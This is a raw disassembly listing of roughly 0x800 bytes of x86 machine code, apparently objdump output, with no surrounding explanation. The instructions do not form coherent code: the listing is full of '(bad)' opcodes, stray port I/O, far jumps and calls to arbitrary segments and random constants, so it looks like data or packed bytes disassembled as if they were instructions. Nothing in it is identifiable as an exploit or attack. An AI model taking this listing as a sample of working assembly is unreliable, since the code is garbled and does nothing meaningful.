  412ef4:	fsubr  DWORD PTR [bp+di]
  412ef7:	ss and al,0xb6
  412efa:	add    al,0xa2
  412efc:	fimul  DWORD PTR [eax]
  412efe:	pop    ebx
  412eff:	push   esp
  412f00:	outs   dx,DWORD PTR ds:[esi]
  412f01:	push   ds
  412f02:	sub    esi,DWORD PTR [esi+0x79]
  412f05:	div    BYTE PTR [eax+0x2f]
  412f08:	into   
  412f09:	aam    0x75
  412f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0c:	jmp    0x412f74
  412f0e:	pop    ds
  412f0f:	loopne 0x412f87
  412f11:	not    BYTE PTR [ebp+0x18]
  412f14:	xchg   esi,eax
  412f15:	and    DWORD PTR [edi],eax
  412f17:	ror    DWORD PTR [edi],0x49
  412f1a:	je     0x412efc
  412f1c:	(bad)  [esi+0x45d61da8]
  412f22:	mov    cl,0x3
  412f24:	sbb    al,0x57
  412f26:	xchg   DWORD PTR [edx],eax
  412f28:	or     DWORD PTR [ebx-0x5c84cb3e],ecx
  412f2e:	cmp    eax,0x7261c244
  412f33:	or     DWORD PTR [ebx-0x5b4d70cf],esi
  412f39:	and    BYTE PTR [esi-0x6e],cl
  412f3c:	add    al,0x5d
  412f3e:	ins    BYTE PTR es:[edi],dx
  412f3f:	ins    BYTE PTR es:[edi],dx
  412f40:	idiv   DWORD PTR [esi+ecx*1+0x40595508]
  412f47:	jne    0x412f8e
  412f49:	mov    ds:0x767b4c2d,eax
  412f4e:	pop    edi
  412f4f:	sub    cl,BYTE PTR [esi+0x4d2b609b]
  412f55:	xor    DWORD PTR ds:0xe72bb7ba,ebx
  412f5b:	lods   eax,DWORD PTR ds:[esi]
  412f5c:	inc    edx
  412f5d:	aad    0x1d
  412f5f:	test   BYTE PTR [edx],dl
  412f61:	xlat   BYTE PTR ds:[ebx]
  412f62:	scas   eax,DWORD PTR es:[edi]
  412f63:	xchg   esp,eax
  412f64:	push   0xffffff8f
  412f66:	ret    0x9439
  412f69:	cmp    dl,cl
  412f6b:	jae    0x412f7b
  412f6d:	jno    0x412eef
  412f6f:	adc    DWORD PTR [esi],esi
  412f71:	repz or ch,BYTE PTR [ecx+ebx*8]
  412f75:	pushf  
  412f76:	dec    eax
  412f77:	scas   eax,DWORD PTR es:[edi]
  412f78:	in     al,0x6
  412f7a:	cmp    ch,BYTE PTR [esp+esi*8+0x62fcf0df]
  412f81:	push   ecx
  412f82:	sbb    al,0xd2
  412f84:	jg     0x412f18
  412f86:	push   cs
  412f87:	push   edi
  412f88:	xchg   edi,eax
  412f89:	repz retf 
  412f8b:	fwait
  412f8c:	sar    DWORD PTR [edi+0x4fcc0748],0xe5
  412f93:	out    dx,eax
  412f94:	test   DWORD PTR [edi+0x5e],esi
  412f97:	je     0x412fde
  412f99:	pslld  mm0,QWORD PTR [esi+0x64]
  412f9d:	sbb    DWORD PTR [ebx-0x77],edx
  412fa0:	iret   
  412fa1:	(bad)  
  412fa2:	cmp    eax,0x214e8252
  412fa7:	(bad)  
  412fa8:	xor    DWORD PTR [ebx+0x6fb0d279],edi
  412fae:	pusha  
  412faf:	adc    esp,edi
  412fb1:	xchg   esp,eax
  412fb2:	jns    0x412f38
  412fb4:	(bad)  
  412fb5:	shr    BYTE PTR [edx+0x20865c3d],cl
  412fbb:	mov    ebp,0xfeabd773
  412fc0:	pop    esp
  412fc1:	sbb    bl,bl
  412fc3:	shl    DWORD PTR [eax],cl
  412fc5:	fidiv  WORD PTR [eax]
  412fc7:	push   eax
  412fc8:	add    esp,esp
  412fca:	dec    edx
  412fcb:	xor    al,0xe9
  412fcd:	cmp    dh,0x87
  412fd0:	inc    ecx
  412fd1:	fst    QWORD PTR [ebp+0x2c]
  412fd4:	inc    ebx
  412fd5:	or     DWORD PTR ds:0x2f588da0,esp
  412fdb:	and    al,0xef
  412fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fde:	inc    ebp
  412fdf:	in     al,dx
  412fe0:	mov    ds:0x64d2c38,eax
  412fe5:	int3   
  412fe6:	mov    esp,0xe276dbc7
  412feb:	fsub   DWORD PTR [eax-0x69]
  412fee:	xor    BYTE PTR [edi],0xd7
  412ff1:	pop    esi
  412ff2:	jno    0x412fe1
  412ff4:	scas   al,BYTE PTR es:[edi]
  412ff5:	dec    eax
  412ff6:	or     al,0x3b
  412ff8:	xor    BYTE PTR [esi-0x1a],dh
  412ffb:	mov    BYTE PTR [esi+0x18907b48],dh
  413001:	loop   0x41304a
  413003:	xchg   edx,eax
  413004:	mov    edi,0x5e512d7d
  413009:	xchg   esp,eax
  41300a:	or     dl,BYTE PTR [ebp-0x35c9d8a]
  413010:	push   ds
  413011:	push   0xffffffaa
  413013:	add    DWORD PTR [ebp-0x2068f901],ebx
  413019:	and    BYTE PTR [ebx+0x22eacb99],0x31
  413020:	inc    edx
  413021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413022:	(bad)  
  413023:	jae    0x41309f
  413025:	repz ret 0xefb
  413029:	jp     0x4130a8
  41302b:	inc    edi
  41302c:	add    eax,DWORD PTR [ebx+ecx*1-0x113314b7]
  413033:	fist   DWORD PTR [esi+ecx*8+0x2b]
  413037:	pusha  
  413038:	in     eax,dx
  413039:	je     0x41309c
  41303b:	adc    eax,ebp
  41303d:	test   DWORD PTR [esi+0x7b1ebd47],0xdba7e101
  413047:	sbb    ebp,esi
  413049:	int3   
  41304a:	push   cs
  41304b:	(bad)  
  41304c:	sub    ebx,DWORD PTR [ecx+0x65]
  41304f:	mov    dl,0x9c
  413051:	adc    ecx,DWORD PTR [ebp-0x5719ec1f]
  413057:	jg     0x413016
  413059:	sub    eax,0xf46e6ee0
  41305e:	sub    BYTE PTR [ebx+0x49],ah
  413061:	and    eax,0xef257be7
  413066:	ja     0x412ffa
  413068:	iret   
  413069:	aad    0xb6
  41306b:	xchg   ecx,eax
  41306c:	scas   eax,DWORD PTR es:[edi]
  41306d:	in     al,dx
  41306e:	cmp    ch,ah
  413070:	jge    0x412ff7
  413072:	mov    esi,0xe9173e13
  413077:	shl    BYTE PTR [ebp+0x55b98553],cl
  41307d:	mov    eax,ds:0xa083a85c
  413082:	mov    ecx,0xc8ea1233
  413087:	jg     0x413072
  413089:	and    BYTE PTR [esp+edx*8],0x65
  41308d:	dec    ebp
  41308e:	mov    BYTE PTR [edi+0x3132c89c],dl
  413094:	sti    
  413095:	sbb    DWORD PTR [edi],ecx
  413097:	test   al,0x1b
  413099:	xchg   ecx,eax
  41309a:	je     0x4130e8
  41309c:	xor    esp,DWORD PTR [esi-0x19]
  41309f:	fimul  DWORD PTR [ebx-0x1a5a3ce8]
  4130a5:	es jge 0x413125
  4130a8:	push   ebx
  4130a9:	iret   
  4130aa:	jmp    0xb2bd:0x22b76a81
  4130b1:	ret    
  4130b2:	cmp    BYTE PTR [esp+edx*2+0x10],dl
  4130b6:	popa   
  4130b7:	cmp    cl,BYTE PTR [edx+edi*4]
  4130ba:	push   ebx
  4130bb:	lods   eax,DWORD PTR ds:[esi]
  4130bc:	pop    ss
  4130bd:	mov    ebp,0xfb204d31
  4130c2:	test   DWORD PTR [ebx],ecx
  4130c4:	scas   al,BYTE PTR es:[edi]
  4130c5:	aas    
  4130c6:	in     al,0x5f
  4130c8:	es push ebp
  4130ca:	fnstcw WORD PTR ds:[esi]
  4130cd:	pop    ecx
  4130ce:	or     eax,0x7201e94d
  4130d3:	shl    DWORD PTR [ecx+ecx*2],0x50
  4130d7:	es mov ebp,0x52657e97
  4130dd:	lea    esi,[eax-0x494691f7]
  4130e3:	out    dx,eax
  4130e4:	cmp    bl,BYTE PTR [eax+0x11]
  4130e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e8:	dec    esi
  4130e9:	fcomp  DWORD PTR [edx]
  4130eb:	mov    BYTE PTR [ecx+0x4d],dl
  4130ee:	mov    dh,0xed
  4130f0:	mov    ebx,0x9a371b8a
  4130f5:	and    DWORD PTR [esi+0x75],0x562784f
  4130fc:	mov    bl,0x12
  4130fe:	cld    
  4130ff:	mov    cl,0x15
  413101:	xor    ecx,esp
  413103:	shl    DWORD PTR [ebx+ecx*4+0x3d],1
  413107:	adc    DWORD PTR [edx-0x2905acef],edi
  41310d:	lock nop
  41310f:	std    
  413110:	mov    bh,0xd1
  413112:	dec    esi
  413113:	cld    
  413114:	sar    ebx,1
  413116:	cli    
  413117:	pusha  
  413118:	in     al,0x13
  41311a:	dec    edx
  41311b:	push   esp
  41311c:	outs   dx,BYTE PTR ds:[esi]
  41311d:	sbb    BYTE PTR [ebx+ecx*8-0x35],bh
  413121:	out    0x3,eax
  413123:	dec    ecx
  413124:	cmp    BYTE PTR [ecx-0x1f3c49f7],ah
  41312a:	addr16 push ebx
  41312c:	inc    esi
  41312d:	hlt    
  41312e:	shl    bl,0xe1
  413131:	pusha  
  413132:	cmp    al,0x99
  413134:	outs   dx,DWORD PTR ds:[esi]
  413135:	sbb    BYTE PTR [edx+edx*4+0xb],bl
  413139:	or     bl,BYTE PTR [ecx+0x2a7a7489]
  41313f:	push   edx
  413140:	fs pop ebp
  413142:	call   0xb30d1f36
  413147:	jne    0x4130ea
  413149:	mov    DWORD PTR [edx+esi*4],ebx
  41314c:	inc    edx
  41314d:	aad    0x35
  41314f:	add    dh,BYTE PTR [eax+0x45d91237]
  413155:	into   
  413156:	pop    ebx
  413157:	cmp    BYTE PTR [edx+0x30],ch
  41315a:	aad    0xc3
  41315c:	pop    ebx
  41315d:	dec    esi
  41315e:	pop    ebx
  41315f:	(bad)  
  413160:	push   edi
  413161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413162:	fst    QWORD PTR [eax+0x1c]
  413165:	sub    DWORD PTR cs:[eax+0x3c3ff7d5],eax
  41316c:	jecxz  0x413190
  41316e:	rol    cl,0xca
  413171:	adc    esp,0x622b1615
  413177:	push   es
  413178:	inc    esp
  413179:	mov    ebp,gs
  41317b:	lods   al,BYTE PTR ds:[esi]
  41317c:	add    edx,DWORD PTR [ebx+0x32]
  41317f:	cmp    bl,dl
  413181:	add    eax,0x2b572a94
  413186:	sbb    ebp,eax
  413188:	pop    eax
  413189:	mov    dh,0x3e
  41318b:	inc    esi
  41318c:	adc    eax,ebp
  41318e:	mov    cl,BYTE PTR [edi]
  413190:	clc    
  413191:	(bad)  
  413192:	jmp    0x473d:0x9449c797
  413199:	xor    al,0xa3
  41319b:	mov    edi,0x77991489
  4131a0:	jl     0x413148
  4131a2:	call   0x86ca:0xe412b72c
  4131a9:	xchg   ecx,eax
  4131aa:	jmp    0x4131a2
  4131ac:	sub    ch,ah
  4131ae:	inc    ebx
  4131af:	ficomp DWORD PTR [ecx+ebp*4-0x60]
  4131b3:	adc    DWORD PTR [ecx],esp
  4131b5:	sbb    ebx,DWORD PTR [ecx-0x3b]
  4131b8:	xchg   esp,eax
  4131b9:	add    BYTE PTR [edi],bl
  4131bb:	jno    0x41315c
  4131bd:	xchg   ebx,eax
  4131be:	push   es
  4131bf:	sub    eax,0x9c186354
  4131c4:	fisttp WORD PTR [ebp+0x54622ba4]
  4131ca:	dec    ecx
  4131cb:	mov    BYTE PTR [eax+eiz*1+0x6f70be41],dl
  4131d2:	test   eax,0xef34e0cc
  4131d7:	call   0x1abf:0x1d26aeb5
  4131de:	mov    BYTE PTR [edi+0xc],bh
  4131e1:	or     esi,DWORD PTR [esi+0x41]
  4131e4:	push   ss
  4131e5:	imul   ecx,DWORD PTR ss:[ecx-0x6b],0x3e
  4131ea:	int3   
  4131eb:	pop    esp
  4131ec:	int    0x20
  4131ee:	ret    
  4131ef:	jo     0x41323d
  4131f1:	and    dl,BYTE PTR [eax]
  4131f3:	mov    BYTE PTR [ebx-0x7ff2de80],dl
  4131f9:	sar    dl,cl
  4131fb:	(bad)  
  4131fc:	fs stos BYTE PTR es:[edi],al
  4131fe:	test   al,0x5
  413200:	pop    ecx
  413201:	sub    cl,bh
  413203:	dec    ebx
  413204:	cmp    esp,ecx
  413206:	fsubr  QWORD PTR [edi]
  413208:	and    bh,BYTE PTR [edx+0x54]
  41320b:	push   eax
  41320c:	cmp    BYTE PTR [esi+0x2d],al
  41320f:	scas   eax,DWORD PTR es:[edi]
  413210:	mov    al,ds:0x231566b1
  413215:	int    0xdf
  413217:	dec    esi
  413218:	ror    BYTE PTR [edi],0x74
  41321b:	adc    DWORD PTR [ebx+0x2fca675],eax
  413221:	cs int 0xd5
  413224:	push   edi
  413225:	or     BYTE PTR [ecx-0x4b],0x5c
  413229:	lds    edx,FWORD PTR [ebx-0x41]
  41322c:	in     al,dx
  41322d:	sbb    bh,BYTE PTR [ecx-0x14c81d86]
  413233:	and    al,0xc7
  413235:	and    bh,BYTE PTR [eax]
  413237:	push   ds
  413238:	cli    
  413239:	jns    0x413222
  41323b:	dec    eax
  41323c:	push   0x92d3e630
  413241:	dec    esp
  413242:	xor    BYTE PTR [ebp+ecx*8+0xc352eb8],dl
  413249:	sub    esp,esp
  41324b:	sbb    esp,0x4b
  41324e:	fisubr WORD PTR [ecx+0x51]
  413251:	aad    0x70
  413253:	callw  0x6949
  413257:	or     edi,edx
  413259:	inc    ecx
  41325a:	mov    fs,WORD PTR [eax]
  41325c:	pop    ss
  41325d:	or     bh,dl
  41325f:	out    dx,eax
  413260:	xchg   edi,eax
  413261:	outs   dx,BYTE PTR ds:[esi]
  413262:	or     DWORD PTR [eax],esp
  413264:	pop    ebp
  413265:	fiadd  DWORD PTR [ebx+0x7d]
  413268:	(bad)  
  41326a:	fnstcw WORD PTR [eax-0x4e6e79b0]
  413270:	mov    BYTE PTR [ecx-0x797e1ea0],bl
  413276:	jbe    0x413240
  413278:	xchg   edx,eax
  413279:	ds je  0x41323b
  41327c:	int3   
  41327d:	(bad)  
  41327e:	in     eax,dx
  41327f:	pop    edx
  413280:	xchg   ecx,eax
  413281:	xlat   BYTE PTR ds:[ebx]
  413282:	dec    eax
  413283:	cmp    ah,dl
  413285:	adc    eax,DWORD PTR [eax-0x61]
  413288:	std    
  413289:	dec    eax
  41328a:	cli    
  41328b:	cmp    esi,esp
  41328d:	jp     0x4132ed
  41328f:	sbb    DWORD PTR [eax+0x4a],eax
  413292:	jge    0x41323b
  413294:	inc    ecx
  413295:	sbb    al,0x13
  413297:	std    
  413298:	push   ds
  413299:	add    esp,DWORD PTR [edx]
  41329b:	push   eax
  41329c:	jmp    0x5f39:0x53eba51
  4132a3:	sbb    al,0x2
  4132a5:	jae    0x413234
  4132a7:	(bad)  
  4132a8:	imul   esi,DWORD PTR [ebp+eiz*4-0x4b0593e4],0x271df3a5
  4132b3:	cs pop ebx
  4132b5:	mov    DWORD PTR [ecx+0x16ddbadf],ecx
  4132bb:	sbb    BYTE PTR [edi+0x1fa3d7ce],bl
  4132c1:	push   es
  4132c2:	std    
  4132c3:	push   ebx
  4132c4:	into   
  4132c5:	pop    eax
  4132c6:	arpl   WORD PTR ds:0x7bf4999a,si
  4132cc:	push   0x31
  4132ce:	add    DWORD PTR [esi+edi*8-0x5667e89f],eax
  4132d5:	adc    al,al
  4132d7:	mov    eax,0x2db9727e
  4132dc:	jbe    0x413299
  4132de:	and    BYTE PTR [esi],dh
  4132e0:	pop    eax
  4132e1:	jno    0x413288
  4132e3:	gs ret 0xde55
  4132e7:	sbb    ah,BYTE PTR [ebp-0x41]
  4132ea:	and    al,0xe5
  4132ec:	mov    WORD PTR ss:[ebx+0x3e65de46],ds
  4132f3:	retf   0x5853
  4132f6:	add    ebp,DWORD PTR [ebp-0x4b960210]
  4132fc:	cmp    ch,BYTE PTR [edx+eax*4-0x4e099245]
  413303:	and    ah,al
  413305:	js     0x4132ea
  413307:	sbb    BYTE PTR [edx-0xf27ca01],0xe9
  41330e:	setl   al
  413311:	cs mov al,0x8a
  413314:	je     0x413345
  413316:	mov    ecx,0x6b258ce4
  41331b:	or     DWORD PTR [ebx-0x4c],0xd523ccf0
  413322:	lea    eax,ds:0xb9b7b1e9
  413328:	icebp  
  413329:	xchg   esp,eax
  41332a:	mov    esi,0x3885b7b4
  41332f:	imul   esp,DWORD PTR [esi+0x75],0xffffff8b
  413333:	mov    ds:0x93892967,al
  413338:	(bad)  
  413339:	(bad)  
  41333a:	aas    
  41333b:	mov    eax,ds:0x9a173bc
  413340:	pop    eax
  413341:	popf   
  413342:	popf   
  413343:	rcr    DWORD PTR [eax],cl
  413345:	(bad)  
  413346:	pop    esi
  413347:	pushf  
  413348:	pop    edx
  413349:	jo     0x413334
  41334b:	jne    0x4132ec
  41334d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41334e:	and    al,0x1f
  413350:	push   ebx
  413351:	jne    0x4133c0
  413353:	push   0x4ab01fc1
  413358:	push   esi
  413359:	inc    ebx
  41335a:	dec    eax
  41335b:	stos   DWORD PTR es:[edi],eax
  41335c:	aas    
  41335d:	cmp    edi,DWORD PTR [edi-0x52]
  413360:	mov    bh,0xe1
  413362:	inc    esp
  413363:	sub    DWORD PTR [esi+0x482e59d8],edx
  413369:	or     eax,0x168c4eb6
  41336e:	push   edi
  41336f:	in     al,0x3b
  413371:	in     al,dx
  413372:	mov    bl,0x82
  413374:	push   ebx
  413375:	pop    ebp
  413376:	pop    edx
  413377:	mov    ecx,0x85fbfd07
  41337c:	fbstp  TBYTE PTR [eax]
  41337e:	inc    esi
  41337f:	pop    ebx
  413380:	sti    
  413381:	or     ch,al
  413383:	test   BYTE PTR [eax],ah
  413385:	mov    ebx,0xa3ce31c3
  41338a:	push   edi
  41338b:	cdq    
  41338c:	js     0x4133c9
  41338e:	and    BYTE PTR fs:[edi-0x50d331a9],ah
  413395:	call   0x53fa:0xf90f8af9
  41339c:	or     edx,DWORD PTR [ebx-0x29cede89]
  4133a2:	loop   0x4133f4
  4133a4:	inc    edx
  4133a5:	lock dec ecx
  4133a7:	bound  ebx,QWORD PTR [edx]
  4133a9:	jb     0x413382
  4133ab:	mov    esi,0xd233681
  4133b0:	shl    BYTE PTR [ebx],1
  4133b2:	pop    ecx
  4133b3:	jnp    0x413345
  4133b5:	jge    0x413342
  4133b7:	push   esp
  4133b8:	jmp    0x95c19078
  4133bd:	jl     0x413357
  4133bf:	xor    al,BYTE PTR [edx-0x7c]
  4133c2:	jbe    0x41335f
  4133c4:	dec    ecx
  4133c5:	jmp    0x743a50ab
  4133ca:	add    al,0xa5
  4133cc:	jmp    0x833f:0xd1c9af02
  4133d3:	add    esi,edx
  4133d5:	nop
  4133d6:	pop    ebx
  4133d7:	sahf   
  4133d8:	jb     0x4133a0
  4133da:	mov    ecx,0x483868e3
  4133df:	call   0x970e:0xcafdd81d
  4133e6:	ss (bad) 
  4133e8:	cmp    cl,BYTE PTR [ebp+0x70bbc59]
  4133ee:	pop    ebp
  4133ef:	shr    DWORD PTR [edx-0x38],cl
  4133f2:	push   esi
  4133f3:	mov    cl,0xfe
  4133f5:	jnp    0x41345d
  4133f7:	mov    ecx,0xc8777b52
  4133fc:	rcr    DWORD PTR [esi],cl
  4133fe:	aad    0x44
  413400:	aad    0xef
  413402:	mov    ds:0x360046b5,eax
  413407:	fimul  WORD PTR [edi+0x29]
  41340a:	(bad)  
  41340b:	cli    
  41340c:	in     eax,0xd
  41340e:	jnp    0x413444
  413410:	dec    edi
  413411:	imul   ecx,esp,0x235696f4
  413417:	adc    eax,0x2814687d
  41341c:	xor    dl,BYTE PTR [esi-0x64977a8b]
  413422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413423:	mov    WORD PTR [edx],?
  413425:	pop    ecx
  413426:	or     ch,ah
  413428:	adc    al,0xe9
  41342a:	jno    0x4134a9
  41342c:	je     0x413422
  41342e:	shl    edx,cl
  413430:	mov    ch,al
  413432:	push   ebp
  413433:	adc    cl,BYTE PTR ss:[ecx+0x2c311acc]
  41343a:	sub    esi,DWORD PTR [edx-0xf]
  41343d:	xchg   ebp,eax
  41343e:	mov    DWORD PTR ds:0x50836c11,esi
  413444:	je     0x4134a8
  413446:	push   0xc61a0812
  41344b:	mov    ebx,0x69cf2e66
  413450:	les    ecx,FWORD PTR [esi-0x10b98a7e]
  413456:	add    BYTE PTR [edi],al
  413458:	pushf  
  413459:	push   ecx
  41345a:	dec    esp
  41345b:	inc    edi
  41345c:	js     0x4134b1
  41345e:	bound  edi,QWORD PTR [ebp-0x60]
  413461:	and    BYTE PTR [ebp+eax*2-0xf7d950c],0x98
  413469:	js     0x413408
  41346b:	cmp    cl,cl
  41346d:	mov    ch,0xa2
  41346f:	mov    bh,0xe5
  413471:	sbb    esp,DWORD PTR [eax+edx*8]
  413474:	sbb    dl,ah
  413476:	mov    al,ds:0x49edee35
  41347b:	add    ebp,DWORD PTR [edx+0x2384843b]
  413481:	dec    edx
  413482:	rol    DWORD PTR [edx+0x2e8a34a2],0x79
  413489:	aas    
  41348a:	test   DWORD PTR [esi-0x33],ebx
  41348d:	cmp    ah,BYTE PTR [ecx-0x6b]
  413490:	mov    al,ds:0x81a4324c
  413495:	pop    esi
  413496:	mov    eax,DWORD PTR [edi-0x5a]
  413499:	mov    ds:0x207f9788,eax
  41349e:	(bad)  
  41349f:	in     eax,dx
  4134a0:	mov    es,WORD PTR [ebp+0x74]
  4134a3:	mov    ecx,0x8795fea
  4134a8:	test   eax,0x3e44a92
  4134ae:	push   ebx
  4134af:	mov    ecx,0xf146e987
  4134b4:	lods   al,BYTE PTR ds:[esi]
  4134b5:	inc    edx
  4134b6:	cdq    
  4134b7:	in     al,dx
  4134b8:	(bad)  
  4134b9:	and    dh,BYTE PTR [eax-0x2e]
  4134bc:	mov    esi,DWORD PTR [esi-0x7b7c8619]
  4134c2:	leave  
  4134c3:	lods   eax,DWORD PTR ds:[esi]
  4134c4:	outs   dx,BYTE PTR ds:[esi]
  4134c5:	pop    edi
  4134c6:	imul   edx,DWORD PTR [ecx],0x27
  4134c9:	xchg   BYTE PTR [esi+0x4a],dh
  4134cc:	inc    edi
  4134cd:	or     DWORD PTR [edx+ecx*8+0x4e],ebx
  4134d1:	add    BYTE PTR [esi],al
  4134d3:	pop    edi
  4134d4:	pop    edx
  4134d5:	xor    al,0x61
  4134d7:	jl     0x4134a6
  4134d9:	xor    DWORD PTR [edi],ebp
  4134db:	adc    al,0x88
  4134dd:	adc    al,0x78
  4134df:	gs push es
  4134e1:	adc    BYTE PTR ds:0x6e29529d,dl
  4134e7:	loope  0x4134b5
  4134e9:	(bad)  
  4134ea:	loope  0x41351c
  4134ec:	call   0x6bfe306
  4134f1:	out    dx,al
  4134f2:	push   ebp
  4134f3:	icebp  
  4134f4:	in     eax,dx
  4134f5:	sbb    ebx,DWORD PTR [esi+0x2]
  4134f8:	pop    ebp
  4134f9:	jae    0x413555
  4134fb:	bound  ecx,QWORD PTR [ecx-0x1d341256]
  413501:	ror    BYTE PTR [ebx-0x463fe097],cl
  413507:	jbe    0x413495
  413509:	test   eax,0x3e69890d
  41350e:	push   0xb533f646
  413513:	mov    ss,WORD PTR [eax-0x2e]
  413516:	sub    esi,DWORD PTR [esi]
  413518:	and    cl,cl
  41351a:	ss xor eax,0xee129105
  413520:	and    al,0x32
  413522:	sub    esi,esp
  413524:	int    0x1d
  413526:	(bad)  
  413528:	xchg   esp,eax
  413529:	ror    edi,1
  41352b:	fst    DWORD PTR [ebp-0x5f]
  41352e:	xlat   BYTE PTR ds:[ebx]
  41352f:	jbe    0x41358f
  413531:	cmp    eax,0x3cc2950d
  413536:	ss clc 
  413538:	test   al,0x7b
  41353a:	jecxz  0x4135b4
  41353c:	lock inc ebx
  41353e:	inc    ebp
  41353f:	add    DWORD PTR [edi+edi*4-0x62cbd519],esp
  413546:	mov    eax,es:0x8cc79e3c
  41354c:	inc    ebx
  41354d:	sar    BYTE PTR [ecx+0x35],0xe6
  413551:	bound  edx,QWORD PTR [ebx]
  413553:	(bad)  
  413554:	pop    ebp
  413555:	jmp    0x41354f
  413557:	mov    dh,0xd9
  413559:	ret    0x41d7
  41355c:	(bad)  
  41355d:	enter  0x1916,0xdc
  413561:	leave  
  413562:	cmp    eax,0x20f326a4
  413567:	mov    bh,0x9b
  413569:	pushf  
  41356a:	adc    al,0x8
  41356c:	fisttp DWORD PTR [ebp-0x22]
  41356f:	std    
  413570:	inc    edi
  413571:	mov    edx,DWORD PTR [eax-0x697b4f91]
  413577:	xchg   BYTE PTR [edx-0x3b99fb8a],dh
  41357d:	mov    ecx,0x91418172
  413582:	xor    BYTE PTR [edx-0x1e16576a],bh
  413588:	mov    dh,0xc4
  41358a:	dec    eax
  41358b:	sahf   
  41358c:	pop    ecx
  41358d:	mov    esp,0x10de9c07
  413592:	fadd   QWORD PTR [edx+edx*4]
  413595:	inc    esp
  413596:	test   DWORD PTR [esi-0xd],ecx
  413599:	lahf   
  41359a:	jo     0x4135e6
  41359c:	mov    edx,0x5d26f12d
  4135a1:	jmp    0x7bb5c823
  4135a6:	or     dh,cl
  4135a8:	mov    eax,0x38708a9d
  4135ad:	xchg   ecx,eax
  4135af:	inc    eax
  4135b0:	xchg   DWORD PTR [esi+ecx*8],ecx
  4135b3:	or     dh,dl
  4135b5:	or     eax,DWORD PTR [ebx-0x6902ef27]
  4135bb:	ss jmp 0x38d3aa9c
  4135c1:	js     0x4135fc
  4135c3:	fsubp  st(0),st
  4135c5:	out    dx,eax
  4135c6:	ds pop es
  4135c8:	ret    0x808f
  4135cb:	push   edx
  4135cc:	push   ecx
  4135cd:	loopne 0x41355e
  4135cf:	in     eax,dx
  4135d0:	test   eax,0x5f9988ab
  4135d5:	add    ecx,DWORD PTR [edi-0x3d]
  4135d8:	mov    edi,0xe1f930c4
  4135dd:	adc    DWORD PTR [esi-0x4ebf51ce],0xb9e0444e
  4135e7:	ss mov edi,0x8bacb6
  4135ed:	sbb    al,0x39
  4135ef:	icebp  
  4135f0:	fisubr DWORD PTR [edx-0x2e]
  4135f3:	pop    ss
  4135f4:	sbb    esi,ebx
  4135f6:	aaa    
  4135f7:	push   ebp
  4135f8:	je     0x413603
  4135fa:	int    0x56
  4135fc:	(bad)  [edx-0x3fbb7a7]
  413602:	nop    DWORD PTR [ebx+0x69663317]
  413609:	sub    DWORD PTR [edi],0x30ab6df8
  41360f:	fistp  DWORD PTR [edx+ecx*1+0x7]
  413613:	sub    ah,BYTE PTR [edx]
  413615:	cmp    dl,BYTE PTR [edi-0x42]
  413618:	xchg   ebx,eax
  413619:	ficomp WORD PTR [eax-0x75172a65]
  41361f:	mov    bh,0x4e
  413621:	pop    esp
  413622:	fs pop es
  413624:	pop    ds
  413625:	cmp    ch,BYTE PTR [eax+0x10]
  413628:	inc    eax
  413629:	fdivr  QWORD PTR [esi+0x7ef60e58]
  41362f:	in     eax,0x2e
  413631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413633:	outs   dx,BYTE PTR ds:[esi]
  413634:	lods   eax,DWORD PTR ds:[si]
  413636:	test   bh,0xd0
  413639:	push   ds
  41363a:	add    dh,bl
  41363c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41363d:	(bad)  
  41363e:	lods   eax,DWORD PTR ds:[esi]
  41363f:	movzx  edx,BYTE PTR [ebx-0x4656cae6]
  413646:	mov    ds:0x9f7fe251,eax
  41364b:	fsubr  st,st(7)
  41364d:	mov    ebp,0x79f9abc3
  413652:	and    DWORD PTR [esi+0x76a7b44b],esp
  413658:	arpl   WORD PTR [ecx-0x4b],cx
  41365b:	pop    ebp
  41365c:	fisub  DWORD PTR [edx+0x4f3ba9ea]
  413662:	push   esi
  413663:	ret    
  413664:	cmp    cl,BYTE PTR [ebp+0x65]
  413667:	dec    ecx
  413668:	out    0x2e,al
  41366a:	xchg   BYTE PTR [edi-0x3142c1d2],bl
  413670:	scas   al,BYTE PTR es:[edi]
  413671:	out    0xbd,eax
  413673:	leave  
  413674:	into   
  413675:	cmp    esi,0x57abf8c8
  41367b:	test   eax,0x6eb11cc4
  413680:	pop    es
  413681:	in     eax,0x9e
  413683:	mov    cl,0xd3
  413685:	mov    ah,BYTE PTR [edx+0x27]
  413688:	scas   al,BYTE PTR es:[edi]
  413689:	mov    ah,0xcd
  41368b:	inc    ebp
  41368c:	xor    BYTE PTR [esi-0x5a],cl
  41368f:	in     eax,0xf2
  413691:	xlat   BYTE PTR ds:[ebx]
  413692:	inc    ecx
  413693:	mov    edx,0x6b7338a1
  413698:	dec    eax
  413699:	sbb    eax,0x68755a3f
  41369e:	gs call 0xdbc8:0xce8f7560
  4136a6:	and    edi,eax
  4136a8:	shr    BYTE PTR [esi],0xaf
  4136ab:	mov    ch,0x46
  4136ad:	and    edx,DWORD PTR [esi-0x61]
  4136b0:	loop   0x4136da
  4136b2:	lds    eax,FWORD PTR [edi]
  4136b4:	fucomp st(3)
  4136b6:	or     eax,0x48ad8e01
  4136bb:	loope  0x413689
  4136bd:	pop    ebx
  4136be:	call   0xc992:0x2f2159c0
  4136c5:	pop    edx
  4136c6:	cmp    bl,bh
  4136c8:	or     eax,0xe91dacaf
  4136cd:	cmp    al,0x4f
  4136cf:	nop
  4136d0:	enter  0x89ed,0xc2
  4136d4:	or     BYTE PTR [edx-0x22],0xd2
  4136d8:	cmp    ebp,DWORD PTR [esi+ebx*2-0xde6885d]
  4136df:	push   ebx
  4136e0:	add    DWORD PTR [ecx-0x63],ebx
  4136e3:	int    0x4b
  4136e5:	push   edi
  4136e6:	jmp    0x7bf9cd25
  4136eb:	iret   
  4136ec:	mov    DWORD PTR [esi+0x7a],edi
  4136ef:	scas   eax,DWORD PTR es:[edi]
  4136f0:	aaa    
  4136f1:	xchg   edi,eax
  4136f2:	test   DWORD PTR [edx+eax*4-0xd1294e8],ebx
